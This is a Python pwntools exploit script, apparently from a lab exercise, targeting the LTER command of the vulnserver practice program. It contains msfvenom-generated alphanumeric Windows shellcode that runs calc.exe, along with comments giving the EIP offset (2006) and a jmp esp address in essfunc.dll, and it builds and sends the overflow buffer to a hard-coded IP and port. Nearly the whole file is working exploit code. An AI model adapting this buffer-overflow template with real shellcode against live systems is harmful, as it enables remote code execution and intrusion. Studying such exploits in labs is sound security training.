from pwn import *

# msfvenom -p windows/exec CMD="calc.exe" -e x86/alpha_mixed -v shellcode -f py -b '\x00' BufferRegister=esp
shellcode =  b""
shellcode += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
shellcode += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
shellcode += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x4d"
shellcode += b"\x38\x6c\x42\x55\x50\x33\x30\x55\x50\x73\x50"
shellcode += b"\x4b\x39\x59\x75\x66\x51\x6b\x70\x32\x44\x6c"
shellcode += b"\x4b\x42\x70\x36\x50\x4e\x6b\x31\x42\x44\x4c"
shellcode += b"\x4c\x4b\x61\x42\x35\x44\x6e\x6b\x70\x72\x67"
shellcode += b"\x58\x76\x6f\x48\x37\x32\x6a\x75\x76\x70\x31"
shellcode += b"\x59\x6f\x4e\x4c\x75\x6c\x65\x31\x61\x6c\x44"
shellcode += b"\x42\x64\x6c\x61\x30\x6b\x71\x6a\x6f\x66\x6d"
shellcode += b"\x57\x71\x4a\x67\x69\x72\x38\x72\x66\x32\x70"
shellcode += b"\x57\x6c\x4b\x56\x32\x76\x70\x6c\x4b\x33\x7a"
shellcode += b"\x47\x4c\x6c\x4b\x32\x6c\x54\x51\x30\x78\x6d"
shellcode += b"\x33\x71\x58\x55\x51\x68\x51\x76\x31\x6e\x6b"
shellcode += b"\x46\x39\x57\x50\x37\x71\x6a\x73\x6c\x4b\x42"
shellcode += b"\x69\x36\x78\x4b\x53\x54\x7a\x32\x69\x4c\x4b"
shellcode += b"\x57\x44\x4c\x4b\x46\x61\x68\x56\x74\x71\x79"
shellcode += b"\x6f\x4e\x4c\x6b\x71\x5a\x6f\x64\x4d\x47\x71"
shellcode += b"\x6a\x67\x57\x48\x4d\x30\x53\x45\x38\x76\x33"
shellcode += b"\x33\x51\x6d\x49\x68\x65\x6b\x51\x6d\x76\x44"
shellcode += b"\x42\x55\x78\x64\x53\x68\x6e\x6b\x51\x48\x74"
shellcode += b"\x64\x37\x71\x7a\x73\x72\x46\x6e\x6b\x46\x6c"
shellcode += b"\x62\x6b\x4e\x6b\x73\x68\x45\x4c\x76\x61\x58"
shellcode += b"\x53\x4c\x4b\x35\x54\x4c\x4b\x56\x61\x78\x50"
shellcode += b"\x4c\x49\x43\x74\x65\x74\x67\x54\x71\x4b\x31"
shellcode += b"\x4b\x31\x71\x43\x69\x61\x4a\x66\x31\x39\x6f"
shellcode += b"\x49\x70\x63\x6f\x63\x6f\x30\x5a\x4e\x6b\x55"
shellcode += b"\x42\x48\x6b\x4e\x6d\x71\x4d\x70\x6a\x56\x61"
shellcode += b"\x6c\x4d\x4d\x55\x4f\x42\x57\x70\x75\x50\x57"
shellcode += b"\x70\x66\x30\x43\x58\x74\x71\x6e\x6b\x52\x4f"
shellcode += b"\x4c\x47\x49\x6f\x69\x45\x4f\x4b\x58\x70\x4c"
shellcode += b"\x75\x4d\x72\x63\x66\x63\x58\x49\x36\x6a\x35"
shellcode += b"\x6f\x4d\x6d\x4d\x79\x6f\x4a\x75\x65\x6c\x47"
shellcode += b"\x76\x73\x4c\x46\x6a\x6d\x50\x79\x6b\x69\x70"
shellcode += b"\x42\x55\x76\x65\x4f\x4b\x51\x57\x42\x33\x53"
shellcode += b"\x42\x32\x4f\x42\x4a\x75\x50\x53\x63\x39\x6f"
shellcode += b"\x78\x55\x65\x33\x63\x51\x62\x4c\x72\x43\x34"
shellcode += b"\x6e\x71\x75\x62\x58\x32\x45\x45\x50\x41\x41"

ip = "192.168.23.163"
port = 9999

sh = connect(ip, port)

print sh.recvrepeat(1)

# when buffer length = 3500 -> eip overwrite
# [*] Exact match at offset 2006
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver\essfunc.dll)
# allow character set: [0x01,0x80)
# esp points to the start of the shellcode, therefore, would be possible to use msfvenom to generate a PURELY alphanumeric shellcode by specifying the BufferRegister
# msfvenom -p windows/exec CMD="calc.exe" -e x86/alpha_mixed -v shellcode -f py -b '\x00' BufferRegister=esp

buf = "LTER ."
buf += "A"*2006
buf += "\x03\x12\x50\x62"
buf += shellcode
buf += "B"*(1500-len(shellcode))

sh.sendline(buf)
sh.close()

